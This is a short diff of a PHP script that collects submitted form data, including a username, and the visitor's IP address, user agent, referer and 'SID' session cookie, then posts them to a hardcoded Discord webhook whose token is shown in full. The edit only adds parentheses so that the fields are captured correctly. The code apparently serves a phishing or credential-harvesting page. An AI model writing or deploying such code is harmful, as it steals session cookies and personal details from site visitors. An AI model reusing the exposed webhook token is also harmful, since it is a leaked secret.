@@ -21,12 +21,12 @@ $input = json_decode(file_get_contents('php://input'), true);
     $url = 'https://discord.com/api/webhooks/1535164470857441301/0zbvwxDyrPCIo-3067PQ2sBp7wxindDS5DBorb4cX4P2CF-NrS4K2D7IeyfZsKDxRV6f?wait=true';
     $content = "```json\n" . json_encode($input, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT) . "\n```";
     $embed = [
-        'title' => 'ユーザー名: ' . $input['formdata']['dlym6tweiywa2taq']['value'] ?? null,
-        'description' => 'IPアドレス: ' . $_SERVER['REMOTE_ADDR'] ?? null . "\n" .
-                         'User-Agent: ' . $_SERVER['HTTP_USER_AGENT'] ?? null . "\n" .
-                         'Referer: ' . $_SERVER['HTTP_REFERER'] ?? null . "\n" .
+        'title' => 'ユーザー名: ' . ($input['formdata']['dlym6tweiywa2taq']['value'] ?? null),
+        'description' => 'IPアドレス: ' . ($_SERVER['REMOTE_ADDR'] ?? null) . "\n" .
+                         'User-Agent: ' . ($_SERVER['HTTP_USER_AGENT'] ?? null) . "\n" .
+                         'Referer: ' . ($_SERVER['HTTP_REFERER'] ?? null) . "\n" .
                          'Timestamp: ' . date('Y-m-d H:i:s') . "\n" .
-                         'Cookie: ' . $_COOKIE['SID'] ?? null,
+                         'Cookie: ' . ($_COOKIE['SID'] ?? null),
         'color' => hexdec('333333'),
         'timestamp' => date('c'),
     ];
